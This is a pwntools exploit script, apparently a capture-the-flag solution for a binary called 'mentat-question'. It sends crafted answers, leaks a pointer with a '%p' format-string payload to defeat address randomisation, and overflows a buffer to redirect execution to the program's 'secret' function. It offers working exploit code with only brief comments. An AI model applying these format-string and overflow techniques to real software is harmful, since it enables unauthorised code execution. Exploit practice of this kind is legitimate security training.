from pwn import *

p = gdb.debug("./mentat-question")
e = ELF("./mentat-question")

p.sendlineafter(b"?", b"Division")
p.sendlineafter(b"?", b"123")
p.sendline(str(2**32).encode('ascii')) # Can also just be non-number chars.

p.sendlineafter(b"?", b"Yes %p") # Leak pointer!

p.recvline()

leak = int(p.recvline()[15:29], 16)
e.address = leak - 0x206d # 0x206d is the offset from the pointer stored in RSI to the base of the instrutions.

p.sendlineafter(b"?", b"123")
p.sendline(str(2**32).encode('ascii')) # Can also just be non-number chars.

p.sendlineafter(b"?", b"Yes AAAAAAAAAAAAAAAAAAAA" + p64(e.symbols["secret"] + 4)) # MOVAPS AHHHHHH

p.interactive()
